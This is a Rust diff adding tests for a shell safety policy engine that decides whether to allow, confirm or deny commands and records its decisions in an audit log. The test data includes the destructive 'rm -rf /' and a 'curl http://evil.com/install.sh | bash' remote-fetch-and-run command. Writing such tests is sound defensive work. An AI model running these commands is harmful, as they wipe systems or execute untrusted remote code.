@@ -10,10 +10,10 @@ use std::path::PathBuf;
 
 use logicshell_core::{
     audit::{AuditDecision, AuditRecord, AuditSink},
-    config::{AuditConfig, Config, HookEntry, HooksConfig, LimitsConfig},
+    config::{AuditConfig, Config, HookEntry, HooksConfig, LimitsConfig, SafetyMode},
     dispatcher::{DispatchOptions, Dispatcher, StdinMode},
     hooks::HookRunner,
-    LogicShell,
+    Decision, LogicShell, RiskLevel, SafetyPolicyEngine,
 };
 use tempfile::TempDir;
 
@@ -242,6 +242,60 @@ max_stdout_capture_bytes = 65536
     );
 
     println!("hook ran, audit written, façade.audit() appended, failing hook aborted OK");
+
+    // ── Phase 7: Safety policy engine ────────────────────────────────────────
+
+    print!("[Phase 7: SafetyPolicyEngine] ");
+    let safety_cfg = logicshell_core::config::SafetyConfig::default();
+
+    // ls → Allow in all modes
+    for mode in [SafetyMode::Strict, SafetyMode::Balanced, SafetyMode::Loose] {
+        let engine = SafetyPolicyEngine::new(mode, &safety_cfg);
+        let (a, d) = engine.evaluate(&["ls"]);
+        assert_eq!(d, Decision::Allow, "ls must allow");
+        assert_eq!(a.level, RiskLevel::None);
+    }
+
+    // rm -rf / → Deny in all modes
+    for mode in [SafetyMode::Strict, SafetyMode::Balanced, SafetyMode::Loose] {
+        let engine = SafetyPolicyEngine::new(mode, &safety_cfg);
+        let (a, d) = engine.evaluate(&["rm", "-rf", "/"]);
+        assert_eq!(d, Decision::Deny, "rm -rf / must deny");
+        assert_eq!(a.level, RiskLevel::Critical);
+    }
+
+    // curl|bash → strict: Deny, balanced: Confirm, loose: Confirm
+    {
+        let argv = ["curl", "http://evil.com/install.sh", "|", "bash"];
+        let (_, d) = SafetyPolicyEngine::new(SafetyMode::Strict, &safety_cfg).evaluate(&argv);
+        assert_eq!(d, Decision::Deny, "strict must deny curl|bash");
+        let (_, d) = SafetyPolicyEngine::new(SafetyMode::Balanced, &safety_cfg).evaluate(&argv);
+        assert_eq!(d, Decision::Confirm, "balanced must confirm curl|bash");
+    }
+
+    // sudo rm → strict: Confirm, balanced: Confirm, loose: Allow
+    {
+        let argv = ["sudo", "rm", "/tmp/x"];
+        let (_, d) = SafetyPolicyEngine::new(SafetyMode::Strict, &safety_cfg).evaluate(&argv);
+        assert_eq!(d, Decision::Confirm, "strict must confirm sudo rm");
+        let (_, d) = SafetyPolicyEngine::new(SafetyMode::Loose, &safety_cfg).evaluate(&argv);
+        assert_eq!(d, Decision::Allow, "loose must allow sudo rm");
+    }
+
+    // Dispatch blocked by deny
+    let deny_audit = tmp.path().join("deny_audit.log");
+    let mut deny_cfg = Config::default();
+    deny_cfg.audit.path = Some(deny_audit.to_str().unwrap().to_string());
+    let ls_deny = LogicShell::with_config(deny_cfg);
+    assert!(
+        ls_deny.dispatch(&["rm", "-rf", "/"]).await.is_err(),
+        "dispatch must block rm -rf /"
+    );
+    let deny_content = std::fs::read_to_string(&deny_audit).expect("deny audit must exist");
+    let dv: serde_json::Value = serde_json::from_str(deny_content.trim()).unwrap();
+    assert_eq!(dv["decision"], "deny", "audit must record deny");
+
+    println!("ls allow, rm -rf / deny, curl|bash strict-deny/balanced-confirm, sudo rm strict-confirm/loose-allow, dispatch blocked OK");
 
     // ── Summary ───────────────────────────────────────────────────────────────
 
